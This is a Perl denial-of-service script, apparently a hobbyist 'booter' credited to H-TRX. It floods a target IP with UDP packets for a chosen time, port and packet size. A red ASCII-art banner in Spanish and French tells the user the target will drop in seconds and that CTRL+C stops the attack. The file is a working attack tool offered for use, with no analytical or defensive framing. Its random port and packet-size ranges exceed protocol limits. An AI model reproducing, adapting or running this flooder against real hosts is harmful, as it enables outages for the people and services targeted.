 #!/usr/bin/perl

##
# WM|WEB00T
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor;
print color 'red';
print <<EOTEXT;

             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |  C:\> _                                      |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'

ooooooooo                                        
 888    88o   ooooooo  oooo  o  oooo oo oooooo   
 888    888 888     888 888 888 888   888   888  
 888    888 888     888  888888888    888   888  
o888ooo88     88ooo88     88   88    o888o o888o 

Script por H-TRX Enjoy

 ~Tu objetivo: $ip  Caida en unos degundos !
 ~Tiempo $time Tirando la ip !
 ~A usado el puerto ($port)
 ~Los paquetes ($size)

EOTEXT
use Term::ANSIColor;
print color 'cyan';
print "IP: $ip " . "PUERTO: " . ($port ? $port : "random") . " 
PAQUETES: " .
  ($size ? "$size BYTE(S)" : "PUISSANCE MAX DU VPS !") . " 
" .
  ($time ? " POUR $time SECONDE(S)" : "") . "\n";
print "STOPPER L'ATTAQUE: CTRL + C" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}          
